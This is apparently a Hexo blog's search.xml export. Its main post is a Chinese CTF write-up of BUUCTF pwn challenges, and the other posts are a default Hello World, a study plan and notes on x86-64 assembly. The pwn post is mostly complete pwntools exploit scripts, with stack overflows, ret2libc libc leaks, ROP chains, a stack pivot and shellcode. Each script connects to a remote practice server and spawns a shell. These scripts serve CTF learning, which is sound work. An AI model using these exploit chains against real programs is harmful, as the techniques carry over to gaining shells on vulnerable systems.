<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>buuctf刷题记录</title>
    <url>/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="栈问题"><a href="#栈问题" class="headerlink" title="栈问题"></a>栈问题</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p><strong>checksec</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>get_flag()有两个参数，a1和a2。这里我已经将a1和a2转换成了十六进制。if对a1和a2进行了一个判断，符合条件后进行对flag的读取。具体读取过程为：首先v2对flag.txt文件进行一个读取，v3用getc()来接收v2读取的值(getc():从指定的流stream获取下一个字符(一个无符号字符)，并把位置标识符往前移动)。在v3不为255时，将值传给v4，用中间变量v5来读取v2的值，并且在v5不为255时，将v5的值赋给v4并输出v4，最终输出的结果就是flag</p>
<p>但是我们发现通过main()的stackoverflow单纯的跳到get_flag()这个函数是无法拿到flag的，这里是因为我们在stackoverflow时覆盖了a1和a2，破坏了输出flag的条件，从而无法得到flag。我们试想，如果我们在stackoverflow时保护了栈结构，使程序达到输出flag的条件，正常退出，是否就可以拿到flag？</p>
<p>于是我们需要<code>exit()</code>的地址，以及满足条件的a1和a2的值，即<code>0x308CD64F</code>和<code>0x195719D1</code></p>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;i386&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27026</span>)</span><br><span class="line">ret = <span class="number">0x08048196</span></span><br><span class="line">exits = elf.sym[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;got exit addr : %s&quot;</span> % <span class="built_in">hex</span>(exits))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span> + p32(<span class="number">0x080489A0</span>) + p32(exits) + p32(<span class="number">0x308CD64F</span>)</span><br><span class="line">+ p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Qual a palavrinha magica? &quot;</span> , timeout = <span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>from pwn import *</p>
<p>io &#x3D; process(“.&#x2F;pwn”)<br>io &#x3D; remote(‘node4.buuoj.cn’,25352)<br>elf &#x3D; ELF(“.&#x2F;pwn”)<br>libc &#x3D; ELF(“libc-2.23.so”)</p>
<p>context(log_level&#x3D;”debug”,arch&#x3D;”i386”)</p>
<p>write_plt &#x3D; elf.plt[“write”]’’’选择用write函数泄露libc地址’’’<br>read_got &#x3D; elf.got[“read”]<br>main_func &#x3D; 0x08048825</p>
<p>payload1 &#x3D; b”\x00”长度检测绕过+ b”\xff”*7让buf[7]的值尽可能大,\为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。</p>
<p>io.sendline(payload1)<br>io.recvline()<br>payload2 &#x3D; flat([b”a”*0xE7,b”b”*4,write_plt,main_func,1,read_got,0x8])</p>
<p>io.sendline(payload2)</p>
<p>read_addr &#x3D; u32(io.recv(4))<br>print(read_addr)</p>
<p>libcbase &#x3D; read_addr - libc.symbols[“read”]<br>#print libcbase<br>system_addr &#x3D; libcbase + libc.symbols[“system”]<br>binsh &#x3D; libcbase + next(libc.search(b”&#x2F;bin&#x2F;sh”))<br>print(binsh)<br>payload3 &#x3D; flat([b”a”*0xe7,b”b”*4,system_addr,0,binsh])</p>
<p>io.sendline(payload1)<br>io.recvline()<br>io.sendline(payload3)</p>
<p>io.interactive()</p>
<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>from pwn import *<br>r&#x3D; remote(‘node4.buuoj.cn’,27435)<br>elf&#x3D;ELF(“.&#x2F;level2_x64”)<br>sys_addr&#x3D;elf.symbols[‘system’]<br>payload&#x3D;b’a’*0x88+p64(0x4006b3)+p64(0x600a90)+p64(sys_addr)<br>r.sendline(payload)<br>r.interactive()</p>
<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>from pwn import *<br>from LibcSearcher import *<br>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)<br>ret &#x3D; 0x4006b9      #靶机是ubuntu，所以需要栈平衡<br>elf &#x3D; ELF(‘pwn1’)<br>puts_plt &#x3D; elf.plt[“puts”]<br>puts_got &#x3D; elf.got[‘puts’]<br>main_addr &#x3D; elf.symbols[“main”]<br>pop_rdi_ret &#x3D; 0x400c83      #×64程序基本都存在的一个地址pop rdi；ret<br>p &#x3D; remote(‘node4.buuoj.cn’,25016)<br>payload &#x3D; b’a’ * (0x50 + 8)<br>payload &#x3D; payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>    print(payload)<br>p.sendlineafter(‘Input your choice!\n’, ‘1’)<br>p.sendlineafter(‘Input your Plaintext to be encrypted\n’, payload)<br>p.recvuntil(‘Ciphertext\n’)	<br>p.recvline()<br>puts_addr &#x3D; u64(p.recv(7)[:-1].ljust(8,b’\x00’))<br>print(puts_addr)      #找出puts的地址<br>libc &#x3D; LibcSearcher(‘puts’, puts_addr)<br>libc_base   &#x3D; puts_addr - libc.dump(‘puts’)      #找出函数地址偏移量<br>system_addr &#x3D; libc_base + libc.dump(‘system’)      #计算出system的在程序中的地址<br>binsh_addr  &#x3D; libc_base + libc.dump(‘str_bin_sh’)	<br>payload &#x3D; b’a’ * (0x50 + 8)<br>payload &#x3D; payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>p.sendlineafter(‘Input your choice!\n’, ‘1’)<br>p.sendlineafter(‘Input your Plaintext to be encrypted\n’, payload)<br>p.interactive()</p>
<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>from pwn import *<br>elf &#x3D; ELF(“.&#x2F;not_the_same_3dsctf_2016”)<br>io &#x3D; remote(“node4.buuoj.cn”,28787)<br>io &#x3D; process(“.&#x2F;not_the_same_3dsctf_2016”)<br>backdoor_addr &#x3D; 0x080489A0<br>str_flag_addr &#x3D; 0x080ECA2D<br>printf_addr &#x3D; 0x0804F0A0<br>write_addr &#x3D; elf.symbols[‘write’]<br>exit_addr &#x3D; elf.symbols[‘exit’]<br>print(hex(write_addr))<br>这个main函数没有push ebp 所以不用再覆盖4字节的ebp<br>payload &#x3D; 0x2D * b’a’ + p32(backdoor_addr) + p32(write_addr) + p32(exit_addr) + p32(1) + p32(str_flag_addr) + p32(45)#覆盖了栈，没有覆盖ebp，原因是不存在ebp，字符串空间的底部就是函数的返回地址覆盖返回地址，返回到get_secret函数从get_secret函数返回到write函数#exit位置是write的返回的值，没什么用，随便填<br>payload +&#x3D; p32(1)           # write函数的第一个参数，是 文件描述符；<br>payload +&#x3D; p32(flagaddr)    # write函数的第二个参数，是 存放字符串的内存地址；<br>payload +&#x3D; p32(42)          # write函数的第三个参数，是 打印字符串的长度<br>io.sendline(payload)<br>io.interactive()<br>io.close()</p>
<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>from pwn import *<br>context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>elf &#x3D; ELF(“.&#x2F;pwn4”)<br>p &#x3D; remote(‘node4.buuoj.cn’,25661)<br>shellcode&#x3D;asm(shellcraft.sh())<br>p.sendlineafter(‘name\n’,shellcode)<br>payload&#x3D;flat(b’a’*0x28+p64(0x601080))<br>p.sendlineafter(‘me?\n’,payload)<br>p.interactive()</p>
<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>#encoding &#x3D; utf-8<br>from pwn import *<br>from LibcSearcher import *<br>context(os &#x3D; ‘linux’,arch &#x3D; ‘i386’,log_level &#x3D; ‘debug’)<br>elf &#x3D; ELF(‘.&#x2F;2018_rop’)<br>p &#x3D; remote(‘node4.buuoj.cn’,25020)<br>main_addr      &#x3D; elf.sym[‘main’]<br>plt_write_addr &#x3D; elf.plt[‘write’]<br>got_write_addr &#x3D; elf.got[‘write’]<br>payload        &#x3D; b’a’<em>(0x88+0x4) + p32(plt_write_addr) + p32(main_addr) + p32(1) + p32(got_write_addr) + p32(4)<br>p.sendline(payload)<br>write_addr     &#x3D; u32(p.recv(4))<br>print(hex(write_addr))<br>lib             &#x3D; LibcSearcher(‘write’,write_addr)<br>lib_write_addr  &#x3D; lib.dump(‘write’)<br>lib_system_addr &#x3D; lib.dump(‘system’)<br>lib_bin_addr    &#x3D; lib.dump(‘str_bin_sh’)<br>base_addr       &#x3D; write_addr - lib_write_addr<br>system_addr     &#x3D; base_addr  + lib_system_addr<br>bin_addr 	&#x3D; base_addr  + lib_bin_addr<br>payload &#x3D; b’a’</em>(0x88+0x4) + p32(system_addr) + b’aaaa’ + p32(bin_addr)<br>p.sendline(payload)<br>p.interactive()</p>
<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>from pwn import*<br>from LibcSearcher import *<br>context.log_level&#x3D;’debug’<br>r&#x3D;remote(‘node4.buuoj.cn’,28646)<br>elf&#x3D;ELF(‘.&#x2F;pwn6’)<br>main_addr&#x3D;elf.sym[‘main’]<br>puts_plt&#x3D;elf.plt[‘puts’]<br>puts_got&#x3D;elf.got[‘puts’]<br>pop_ret&#x3D;0x400733<br>payload1&#x3D;b’a’*0x28+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</p>
<p>这里需要注意一下payload64位先往寄存器中传参顺序要注意！！！<br>r.recvuntil(“Pull up your sword and tell me u story!”)<br>r.sendline(payload1)<br>r.recv()<br>puts_addr&#x3D;u64(r.recv(6).ljust(8,b’\x00’))<br>libc&#x3D;LibcSearcher(‘puts’,puts_addr)<br>libc_base &#x3D; puts_addr - libc.dump(‘puts’)<br>system &#x3D; libc_base+libc.dump(‘system’)<br>bins &#x3D; libc_base+libc.dump(‘str_bin_sh’)<br>payload2&#x3D;b’A’*0x28+p64(pop_ret)+p64(bins)+p64(system)<br>r.recvuntil(“Pull up your sword and tell me u story!”)<br>r.sendline(payload2)<br>r.interactive()</p>
<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><p>from pwn import*<br>elf&#x3D;ELF(‘pwn7’)<br>r&#x3D;remote(‘node4.buuoj.cn’,28553)<br>back_addr&#x3D;elf.symbols[‘backdoor’]<br>r.recv()<br>r.sendline(b’-1’)<br>payload&#x3D;b’a’*(0x10+8)+p64(back_addr)<br>r.sendline(payload)<br>r.interactive()</p>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>from pwn import *<br>context(os&#x3D;”linux”,arch&#x3D;”i386”,log_level&#x3D;”debug”)<br>elf&#x3D;ELF(‘pwn8’)<br>p&#x3D;remote(‘node4.buuoj.cn’,29794)<br>sys_addr&#x3D;0x08048400<br>leave_addr&#x3D;0x8048562<br>payload1&#x3D;b’a’*0x27<br>p.sendlineafter(‘name?\n’,payload1)<br>p.recvuntil(‘\n’)<br>ebp&#x3D;u32(p.recv(4))<br>payload2&#x3D;b’a’*4+p32(sys_addr)+p32(0)+p32(ebp-0x28)+b’&#x2F;bin&#x2F;sh’<br>payload2&#x3D;payload2.ljust(0x28,b’\0’)<br>payload2+&#x3D;p32(ebp-0x38)看当时的ebp+p32(leave_addr)<br>p.sendline(payload2)<br>p.interactive()</p>
<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><p>整数溢出问题<br>from pwn import*<br>from LibcSearcher import*<br>p&#x3D;remote(‘node4.buuoj.cn’,29476)<br>elf&#x3D;ELF(‘.&#x2F;pwn9’)<br>printf_plt&#x3D;elf.plt[‘printf’]<br>printf_got&#x3D;elf.got[‘printf’]<br>vuln&#x3D;0x0804852f<br>main&#x3D;0x080485b8<br>p.recvuntil(‘read?’)<br>p.sendline(str(-1))<br>p.recvuntil(‘data!\n’)<br>payload&#x3D;b’a’*0x30+p32(printf_plt)+p32(vuln)+p32(printf_got)<br>p.sendline(payload)<br>p.recvuntil(‘\n’)<br>printf_add&#x3D;u32(p.recv(4))<br>print(hex(printf_add))<br>libc&#x3D;LibcSearcher(‘printf’,printf_add)<br>libc_base&#x3D;printf_add-libc.dump(‘printf’)<br>system&#x3D;libc_base+libc.dump(‘system’)<br>binsh&#x3D;libc_base+libc.dump(‘str_bin_sh’)<br>p.recvuntil(‘read?’)<br>p.sendline(str(-1))<br>p.recvuntil(‘data!\n’)<br>payload&#x3D;b’a’*0x30+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()</p>
<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><p>32位ret2libc<br>from pwn import *<br>from LibcSearcher import *<br>context.log_level &#x3D; ‘debug’<br>conn &#x3D; remote(‘node4.buuoj.cn’,25837)<br>elf &#x3D; ELF(‘.&#x2F;level3’)<br>write_plt &#x3D; elf.plt[‘write’]<br>write_got &#x3D; elf.got[‘write’]<br>main_addr &#x3D; 0x0804844B<br>payload &#x3D; b’a’*0x88 + b’b’*4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)<br>conn.sendlineafter(“Input:\n”,payload)<br>write_addr &#x3D; u32(conn.recv(4))<br>print(hex(write_addr))<br>libc &#x3D; LibcSearcher(‘write’,write_addr)<br>libc_base &#x3D; write_addr - libc.dump(‘write’)<br>system_addr &#x3D; libc_base + libc.dump(‘system’)<br>bin_sh &#x3D; libc_base + libc.dump(‘str_bin_sh’)<br>payload &#x3D; b’a’*0x88 + b’b’*4 + p32(system_addr) + p32(main_addr) + p32(bin_sh)<br>conn.sendlineafter(“Input:\n”,payload)<br>conn.interactive()</p>
<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><p>from pwn import *</p>
<p>#start<br>r &#x3D; remote(‘node4.buuoj.cn’,25683)<br>r &#x3D; process(“..&#x2F;buu&#x2F;[HarekazeCTF2019]baby_rop2”)<br>elf &#x3D; ELF(‘babyrop2’)<br>libc &#x3D; ELF(“libc.so.6”)</p>
<p>#params<br>rdi_addr &#x3D; 0x400733<br>rsi_r15_addr &#x3D; 0x400731<br>main_addr &#x3D; elf.symbols[‘main’]<br>printf_plt&#x3D;elf.plt[‘printf’]<br>read_got&#x3D;elf.got[‘read’]<br>format_str &#x3D; 0x400770</p>
<p>#attack<br>payload&#x3D;b’M’*(0x20+8) + p64(rdi_addr) + p64(format_str) + p64(rsi_r15_addr) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)<br>r.recv()<br>r.sendline(payload)<br>read_addr &#x3D; u64(r.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))<br>print(“read_addr: “ + hex(read_addr))</p>
<p>#libc<br>base_addr &#x3D; read_addr - libc.symbols[‘read’]<br>system_addr &#x3D; base_addr + libc.symbols[‘system’]<br>bin_sh_addr &#x3D; base_addr + next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>print(“system_addr: “ + (hex(system_addr)))<br>print(“bin_sh_addr: “ + (hex(bin_sh_addr)))</p>
<p>#attack2<br>payload&#x3D;b’M’*(0x20+8) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)<br>r.recv()<br>r.sendline(payload)</p>
<p>r.interactive()</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/02/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>周计划</title>
    <url>/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/</url>
    <content><![CDATA[<h1 id="大一下学期目标"><a href="#大一下学期目标" class="headerlink" title="大一下学期目标"></a>大一下学期目标</h1><p><strong>完成《深入了解操作系统》的阅读以及lab的练习</strong></p>
<p><strong>完成<em>MIT.6S081</em>课程学习和lab的练习</strong></p>
<p><strong>主线</strong>：<strong>学习pwn的栈 堆和内核</strong></p>
<p><strong>主线</strong>：<strong>完成现代c++的学习</strong></p>
<h2 id="第4周"><a href="#第4周" class="headerlink" title="第4周"></a>第4周</h2><p>总目标：</p>
<p><strong>现代c++：</strong>part1，part2，part3. </p>
<p><strong>pwn：</strong>理解堆</p>
<p><strong>xv6：</strong>lab1完成</p>
<p><strong>re:</strong> 简单了解逆向</p>
<h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>现代c++：程序的执行过程，new关键字及内存内存，命名空间，c++的标准输入输出简历</p>
<p>pwn：堆理解</p>
<p>逆向刷题</p>
<p>pwn刷题</p>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>现代c++：const关键字介绍 ，auto关键字使用</p>
<p>pwn ：刷题整理</p>
]]></content>
      <categories>
        <category>计划</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言简单摘要</title>
    <url>/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/</url>
    <content><![CDATA[<h3 id="x86-64位寄存器（16个）"><a href="#x86-64位寄存器（16个）" class="headerlink" title="x86-64位寄存器（16个）"></a>x86-64位寄存器（16个）</h3><p>rax：存放保存函数返回值<br>rbx：被调用者保存<br>rdi rsi rdx rcx 对应第1、2、3、4个参数<br>rsp：栈指针，存放栈帧的栈顶的偏移地址<br>r8 r9对应第5、6个参数</p>
<h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><p>立即数寻址$Imm Imm(立即数)<br>寄存器寻址%ra R[ra] (寄存器)<br>绝对寻址Imm M[Imm] (存储器)<br>间接寻址（%ra）M[R[[ra]]</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下面有一点地址或寄存器的值，写出操作数的值</span><br><span class="line">地址          值              寄存器       值</span><br><span class="line">0x100      0xFF             rax        0x100</span><br><span class="line">0x104      0xab             rcx        0x1</span><br><span class="line">0x108      0x13             rdx        0x3</span><br><span class="line">0x10C      0x11</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">操作数  值</span><br><span class="line">rax 0x100(寄存器)</span><br><span class="line">0x104 0xab（绝对寻址）</span><br><span class="line"><span class="variable">$0x108</span> 0x108（立即数寻址）</span><br><span class="line">(%rax) 0xFF（间接寻址）</span><br></pre></td></tr></table></figure>

<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>两种汇编模式<br>ATT汇编movq movb<br>普通汇编 mov <strong>rax,rbx</strong>&#x3D;mov<strong>q %rbx,%rax</strong> （ATT）：把rbx的值赋给rax</p>
<h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov 数据传送指令 将数据从一个位置复制到另一个位置的指令<br>mov 寄存器&#x2F;立即数 操作数用来指向一个执行所要使用源数据的值，放置结果的目的位置，mov 源操作数的值是一个立即数，值存放在内存或者寄存器中 目的操作数一个寄存器或者是一个内存地址。</p>
<p><strong>单位</strong>：1字节 &#x3D; 8bit  1字 &#x3D; 8字节 &#x3D; 64bit</p>
<p><strong>movb 一个字节</strong> (这个字代表双字节的意思，与上边的字不一样)<br><strong>movw 一个字<br>movl 双字（寄存器的高四字节设置成0）<br>movq 四字<br>movabsq I,R  R&lt;-I 传送的是绝对的四字 目的操作数只能是寄存器</strong><br>movl $0x4050,%eax      4bytes   立即数–寄存器<br>movw %bp,%sp           2bytes   寄存器–寄存器<br>movb (%rdi,%rcx),%al   1bytes  内存–寄存器<br>movb $-17,(%rsp)       1bytes   立即数–内存<br>movq %rax,-12(%rbp)    8bytes   寄存器–内存l</p>
<h5 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">movabsq <span class="variable">$0x0011223344556677</span> , %rax = 0011223344556677  </span><br><span class="line">（ rax包含了eax eax包含了ax ax包含了al）</span><br><span class="line">-1的16进制是0xFFFFFFFFFFFFFF,第一步结束后每一步rax的值是多少</span><br><span class="line">movb $-1 ,%al           ， %rax = 00112233445566FF   F = 1111</span><br><span class="line">movw $-1 , %ax          ， %rax = 001122334455FFFF   </span><br><span class="line">movl $-1 , %eax         ， %rax = 00000000FFFFFFFF</span><br><span class="line">movq $-1 ,%rax          ， %rax = FFFFFFFFFFFFFFFF </span><br></pre></td></tr></table></figure>


<h5 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h5><p>把下列汇编代码用c语言表示  （rax一直保存的是返回值）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">decode1:</span><br><span class="line">    movq (%rdi) , %r8</span><br><span class="line">    movq (%rsi) , %rcx</span><br><span class="line">    movq (%rdx) , %rax</span><br><span class="line">    movq %r8    , (%rsi)</span><br><span class="line">    movq %rcx   , (%rdx)</span><br><span class="line">    movq %rax ,   (%rdx)      </span><br><span class="line">    ret </span><br></pre></td></tr></table></figure>
<p>c语言</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode1</span><span class="params">(<span class="type">long</span> *xp,<span class="type">long</span> *yp,<span class="type">long</span> *zp)</span>&#123;</span><br><span class="line">     <span class="type">long</span> x = *xp;</span><br><span class="line">     <span class="type">long</span> y = *yp;</span><br><span class="line">     <span class="type">long</span> z = *zp;</span><br><span class="line">     *yp = x;</span><br><span class="line">     *zp = y;</span><br><span class="line">     *xp = z;</span><br><span class="line">     <span class="keyword">return</span> z;</span><br><span class="line"> &#125;    </span><br><span class="line">     </span><br></pre></td></tr></table></figure>
<h4 id="push和pop"><a href="#push和pop" class="headerlink" title="push和pop"></a>push和pop</h4><p>push压入栈 pop弹出栈（pop弹出的值一直是一个最近压入栈的数据且仍在栈中）<br>由于栈是由大到小增长的，所以栈顶永远是地址最低的 %rsp保存着栈顶的元素<br>pushq popq 将四字压入栈中 将四字弹出栈<br>pushq %rbp &#x3D; subq $8,%rsp  movq %rbp,(%rsp)   （rsp地址减8）<br>popq <strong>%rax</strong>  &lt;&#x3D;&#x3D;&gt; movq (%rsp),(<strong>%rax</strong>) addq $8,%rsp （rsp地址加8）<br><strong>pop之后，值不会被删除，除非有一个新的值覆盖了原先的值</strong></p>
<h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">leaq  --&gt; 加载有效地址 </span><br><span class="line">inc --&gt; 加一 </span><br><span class="line">dec --&gt; 减一 </span><br><span class="line">neg --&gt; 取负 </span><br><span class="line">not --&gt; 取补 </span><br><span class="line">add --&gt; 加 </span><br><span class="line">sub --&gt; 减 </span><br><span class="line">imul --&gt; 乘 </span><br><span class="line">xor --&gt; 异或 </span><br><span class="line">or --&gt; 或 </span><br><span class="line">and --&gt; 与 </span><br><span class="line">sal --&gt; 算数左移 </span><br><span class="line"> sar --&gt; 算数右移 </span><br><span class="line"> shl --&gt;逻辑左移</span><br><span class="line">shr --&gt; 逻辑右移</span><br></pre></td></tr></table></figure>
<h5 id="1-加载地址"><a href="#1-加载地址" class="headerlink" title="1.加载地址"></a>1.加载地址</h5><p>movq的一种变形 从内存读数据到寄存器 但是没有引用内存 不是单纯的读数据，而是将有效地址加载到目的操作数 <strong>描述简单的算数操作</strong></p>
<h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6><p>rdi &#x3D; x<br> leaq 7(%rdi,%rdi,4),%rax &#x3D;&#x3D; 将rax的值设置为5x+7</p>
